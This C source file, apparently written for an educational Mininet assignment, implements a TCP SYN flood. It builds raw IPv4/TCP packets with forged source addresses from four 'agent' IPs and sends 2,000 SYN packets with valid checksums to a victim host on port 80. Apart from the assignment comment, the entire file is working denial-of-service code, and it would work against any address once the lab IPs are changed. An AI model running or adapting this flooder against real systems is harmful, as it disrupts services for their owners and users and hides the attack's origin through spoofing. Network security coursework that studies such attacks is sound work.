// TCP SYN Flood using RAW sockets (Educational Mininet Assignment)
// Matches Assignment 11 exactly:
// - 1 attacker host runs this code
// - 4 spoofed agent IPs
// - Victim receives many TCP SYN packets

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// --------- TCP checksum (with pseudo header) -------------------
struct pseudo_header {
    unsigned int src;
    unsigned int dst;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_len;
};

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte, answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)~sum;
    return answer;
}

int main() {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL error");
        exit(1);
    }

    // ---------------- SPOOFED AGENTS (4 hosts) ---------------------
    char *agents[] = {
        "10.0.0.2",
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5"
    };

    int num_agents = sizeof(agents) / sizeof(agents[0]);

    // victim host
    char victim[] = "10.0.0.6";

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(victim);

    printf("TCP SYN Flood starting...\n");

    for (int round = 0; round < 500; round++) {
        for (int i = 0; i < num_agents; i++) {

            char packet[4096];
            memset(packet, 0, 4096);

            struct iphdr *iph = (struct iphdr *) packet;
            struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));

            // ---------------- IP Header ------------------
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 64;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = inet_addr(agents[i]);    // SPOOFED SOURCE
            iph->daddr = dest.sin_addr.s_addr;
            iph->check = 0;
            iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

            // ---------------- TCP Header ------------------
            tcph->source = htons(rand() % 65535);     // random spoofed port
            tcph->dest = htons(80);                   // SYN to port 80
            tcph->seq = htonl(rand());
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->syn = 1;      // <---- SYN FLAG SET
            tcph->window = htons(65535);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            // -------- pseudo header for checksum ----------
            struct pseudo_header psh;
            psh.src = iph->saddr;
            psh.dst = iph->daddr;
            psh.zero = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_len = htons(sizeof(struct tcphdr));

            char pseudo_buffer[4096];
            memcpy(pseudo_buffer, &psh, sizeof(struct pseudo_header));
            memcpy(pseudo_buffer + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

            tcph->check = checksum((unsigned short *)pseudo_buffer,
                                   sizeof(struct pseudo_header) + sizeof(struct tcphdr));

            // ------------ SEND PACKET --------------------
            if (sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                       (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                perror("Send error");
            }

            printf("Round %d | Sent SYN from %s -> %s\n",
                   round + 1, agents[i], victim);
        }
    }

    close(sockfd);
    return 0;
}

